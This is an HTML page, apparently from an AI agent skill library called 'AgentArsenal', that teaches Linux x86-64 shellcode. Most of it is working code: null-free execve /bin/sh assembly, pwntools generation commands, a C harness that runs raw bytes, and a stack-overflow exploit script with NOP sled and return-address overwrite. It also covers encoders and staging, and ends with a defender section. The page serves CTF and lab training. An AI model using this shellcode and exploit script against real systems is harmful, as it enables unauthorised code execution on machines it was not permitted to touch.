@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: shellcode-basics</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>shellcode-basics</h2><div class="meta"><span class="badge gray">binary</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">100/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when you need to write or use position-independent machine</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="pwn-fundamentals.html">pwn-fundamentals</a> <a href="rop-chains.html">rop-chains</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>nasm</td><td>2.16.x</td></tr><tr><td>pwntools</td><td>4.13</td></tr><tr><td>Python</td><td>3.12</td></tr><tr><td>GDB</td><td>15.x</td></tr></tbody></table><p>Shellcode is machine code written to run wherever it lands in memory: no fixed addresses, no null bytes that would truncate a string copy, and no external dependencies beyond the system call interface. You need it when an exploit can jump to attacker-controlled bytes in executable memory, which happens when NX is disabled or when a ROP chain calls mprotect to make a region executable. This skill covers writing, generating, and testing Linux x86-64 shellcode for authorized targets such as CTF challenges and lab binaries. All work targets systems you have written permission to test.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Confirm you can execute attacker bytes: NX disabled, or a</li>
+<p>writable-executable region from mprotect.</p>
+<li>Choose the payload goal: execve /bin/sh is standard; open/read/write</li>
+<p>fits filtered or seccomp-limited targets.</p>
+<li>Write or generate null-free, position-independent shellcode.</li>
+<li>Assemble and extract the raw bytes.</li>
+<li>Test the shellcode in a local C harness before embedding it in an</li>
+<p>exploit.</p>
+<li>Deliver it: place it in the overflow buffer or a known address, and</li>
+<p>overwrite the return address with its location.</p>
+<li>If input filters mangle the bytes, encode the shellcode and prepend a</li>
+<p>decoder stub.</p>
+</ol>
+<h2>1. Anatomy of execve shellcode</h2>
+<p>The classic payload calls <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>, which is syscall 59 on x86-64 with rdi pointing to the string, rsi zero, rdx zero.</p>
+<pre><code class="language-nasm">; execve(&quot;/bin/sh&quot;, NULL, NULL) - Linux x86-64, null-free
+global _start
+section .text
+_start:
+    xor rsi, rsi             ; argv = NULL
+    xor rdx, rdx             ; envp = NULL
+    mov rbx, 0x68732f6e69622f2f   ; &quot;//bin/sh&quot; as immediate
+    push rbx
+    mov rdi, rsp             ; rdi -&gt; &quot;//bin/sh&quot;
+    push 59                  ; syscall number for execve
+    pop rax
+    syscall</code></pre>
+<p>Why each trick matters:</p>
+<ul>
+<li><code>xor rsi, rsi</code> instead of <code>mov rsi, 0</code>: the immediate zero would</li>
+<p>embed null bytes in the machine code.</p>
+<li><code>&quot;//bin/sh&quot;</code> with a double slash: 8 bytes fill the register exactly,</li>
+<p>avoiding a null terminator byte in the immediate.</p>
+<li><code>push 59; pop rax</code> instead of <code>mov rax, 59</code>: shorter and the</li>
+<p>immediate encoding stays null-free.</p>
+</ul>
+<p>Assemble and extract the bytes:</p>
+<pre><code class="language-bash">nasm -f elf64 shell.asm -o shell.o
+ld shell.o -o shell
+# Extract raw bytes
+objcopy -O binary --only-section=.text shell shellcode.bin
+xxd shellcode.bin
+# Sanity: no 00 bytes
+xxd -p shellcode.bin | grep -q &#x27;00&#x27; &amp;&amp; echo &quot;HAS NULLS&quot; || echo &quot;null-free&quot;</code></pre>
+<h2>2. Generate with pwntools shellcraft</h2>
+<p>Hand-writing teaches the concepts; shellcraft is faster in practice and its output is tested.</p>
+<pre><code class="language-bash"># Generate execve /bin/sh shellcode and show disassembly
+pwn shellcraft amd64.linux.sh
+# Raw bytes for embedding
+pwn shellcraft amd64.linux.sh | xxd -p | tr -d &#x27;\n&#x27;; echo</code></pre>
+<pre><code class="language-python">#!/usr/bin/env python3
+from pwn import *
+context.arch = &#x27;amd64&#x27;
+context.os = &#x27;linux&#x27;
+
+# Standard shells
+sc = shellcraft.sh()                 # execve /bin/sh
+sc = shellcraft.execve(&#x27;/bin/cat&#x27;, [&#x27;/bin/cat&#x27;, &#x27;flag.txt&#x27;])  # read a file
+
+# Inspect before using
+print(disasm(asm(sc)))
+print(&quot;length:&quot;, len(asm(sc)))</code></pre>
+<p>Useful shellcraft one-liners for constrained targets:</p>
+<pre><code class="language-bash">pwn shellcraft amd64.linux.cat flag.txt     # cat a file, no shell needed
+pwn shellcraft amd64.linux.readfile flag.txt 1  # write file to fd 1</code></pre>
+<h2>3. Test in a harness</h2>
+<p>Never embed untested shellcode in an exploit. Run it in a minimal harness first.</p>
+<pre><code class="language-c">// harness.c: execute bytes from a file
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/mman.h&gt;
+int main(int argc, char **argv) {
+    FILE *f = fopen(argv[1], &quot;rb&quot;);
+    fseek(f, 0, SEEK_END);
+    long n = ftell(f); rewind(f);
+    char *mem = mmap(0, n, PROT_READ|PROT_WRITE|PROT_EXEC,
+                     MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+    fread(mem, 1, n, f);
+    ((void(*)())mem)();
+    return 0;
+}</code></pre>
+<pre><code class="language-bash">gcc -o harness harness.c
+./harness shellcode.bin
+# A shell prompt (or the cat output) means the shellcode works</code></pre>
+<p>Debug failures in GDB by breaking at the mapped region and single-stepping the syscalls:</p>
+<pre><code class="language-bash">gdb -q ./harness
+# (gdb) run shellcode.bin
+# (gdb) break *$rax  # after mmap returns, break at shellcode start
+# (gdb) stepi
+# Watch rdi/rsi/rdx/rax before each syscall instruction</code></pre>
+<h2>4. Deliver it in an exploit</h2>
+<p>The standard layout: overflow the buffer, place shellcode after the saved return address (or before it in a large buffer), and overwrite the return address with the shellcode&#x27;s address.</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+from pwn import *
+
+exe = ELF(&#x27;./vuln&#x27;)
+context.arch = &#x27;amd64&#x27;
+OFFSET = 72
+
+# NOP sled absorbs small address errors
+NOP = asm(&#x27;nop&#x27;)
+shellcode = asm(shellcraft.sh())
+
+p = process(&#x27;./vuln&#x27;)
+# Layout: [shellcode][NOP sled][padding][return address -&gt; shellcode]
+buf_addr = 0x7fffffffe000  # example: find the real address via leak or core
+payload = shellcode
+payload += NOP * (OFFSET - len(shellcode))
+payload += p64(buf_addr)
+p.sendline(payload)
+p.interactive()</code></pre>
+<p>Finding the buffer address: if ASLR randomizes the stack, you need a leak (a stack address printed by the binary, or a core dump from a crash). Without a leak, a NOP sled plus brute force only works when the address range is narrow, which modern ASLR defeats.</p>
+<p>The ROP-to-shellcode path (NX enabled): use a ROP chain to call <code>mprotect</code> on a writable region, copy shellcode there, and jump to it. See rop-chains for the chain mechanics; the mprotect call is <code>mprotect(addr, len, PROT_READ|PROT_WRITE|PROT_EXEC)</code>.</p>
+<h2>5. Null-free and position-independent discipline</h2>
+<p>Every byte of shellcode must survive the delivery path:</p>
+<pre><code class="language-bash"># Check for nulls, newlines, and spaces if the input path filters them
+xxd -p shellcode.bin | tr -d &#x27;\n&#x27; | grep -E &#x27;00|0a|20&#x27; &amp;&amp; echo &quot;BAD BYTES PRESENT&quot;</code></pre>
+<p>Techniques to stay clean:</p>
+<ul>
+<li>Zero registers with <code>xor reg, reg</code>, never <code>mov reg, 0</code>.</li>
+<li>Build strings on the stack with pushes, not with absolute addresses.</li>
+<li>Reference data with RIP-relative <code>lea</code>, never hardcoded addresses.</li>
+<li>Avoid <code>0x0a</code> (newline) when input comes through <code>fgets</code> or line</li>
+<p>based protocols; restructure the assembly to dodge the byte.</p>
+</ul>
+<h2>6. Encoders for filtered input</h2>
+<p>When the input path transforms bytes (XOR filter, alphanumeric-only), encode the shellcode and prepend a small decoder that restores it at runtime.</p>
+<pre><code class="language-bash"># pwntools encoders: list and apply
+pwn shellcraft --list | grep -i encoder
+python3 -c &quot;
+from pwn import *
+context.arch = &#x27;amd64&#x27;
+sc = asm(shellcraft.sh())
+enc = encode(sc, b&#x27;\x00&#x27;)  # avoid null bytes in output
+print(&#x27;encoded length:&#x27;, len(enc))
+&quot;</code></pre>
+<p>The encoded payload layout is <code>[decoder stub][encoded shellcode]</code>. The stub runs first, decodes the body in place, and jumps to it. Test the full encoded blob in the harness, not just the raw shellcode, because the stub itself must also be filter-clean.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>NX is enabled and you assumed it was not. Check with checksec</li>
+<p>before writing shellcode; an NX target needs ROP, not shellcode.</p>
+<li>The shellcode works in the harness but crashes in the exploit. The</li>
+<p>usual cause is a wrong buffer address or stack misalignment. Verify the landing address in GDB with a breakpoint on the overwritten return.</p>
+<li><code>execve</code> is blocked by seccomp. The shell spawns and dies</li>
+<p>instantly. Switch to an open/read/write chain that reads the flag directly (shellcraft <code>readfile</code>).</p>
+<li>The input path uppercases or lowercases bytes. Standard shellcode</li>
+<p>will not survive. Use an alphanumeric encoder or find a different input path.</p>
+<li>32-bit target. The syscall numbers and calling convention differ</li>
+<p>(<code>int 0x80</code>, syscall 11 for execve). Set <code>context.arch = &#x27;i386&#x27;</code> and use the i386 shellcraft templates.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>You cannot find an executable writable region: ROP a call to</li>
+<p><code>mmap</code> with RWX permissions to create one, then copy shellcode in with a second stage read.</p>
+<li>The buffer is too small for a full execve payload: use a staged</li>
+<p>approach, a tiny <code>read</code> stub that loads a larger second stage, or an egg hunter if the memory layout is unpredictable.</p>
+<li>Shellcode must fit extreme size limits (under 30 bytes): hand-write</li>
+<p>minimal payloads and drop the NOP sled; every byte counts, so assemble and measure rather than guessing.</p>
+<li>Nothing executes and protections look fine: recheck for seccomp,</li>
+<p>AppArmor, or container restrictions on the target that kill syscalls regardless of memory permissions.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders detect shellcode through NX enforcement (the primary defense: injected code simply faults), intrusion detection on non-printable network input, and behavioral monitoring for unexpected process ancestry (a network daemon spawning a shell). Durable mitigations are NX on all data pages, ASLR so landing addresses are unguessable, seccomp profiles that deny execve to services that never need it, and input validation at the trust boundary. For developers, the fix is eliminating the memory corruption that lets attacker bytes reach the instruction pointer in the first place.</p>
+<h2>Key references</h2>
+<ul>
+<li>CWE-121 (Stack-based Buffer Overflow): the usual delivery bug.</li>
+<li>CWE-787 (Out-of-bounds Write).</li>
+<li>CWE-94 (Improper Control of Generation of Code, Code Injection).</li>
+<li>MITRE ATT&amp;CK T1068 (Exploitation for Privilege Escalation).</li>
+<li>Linux syscall table (x86-64): https://filippo.io/linux-syscall-table/</li>
+<li>NASM documentation: https://www.nasm.us/doc/</li>
+<li>pwntools shellcraft docs: https://docs.pwntools.com/en/stable/shellcraft/</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
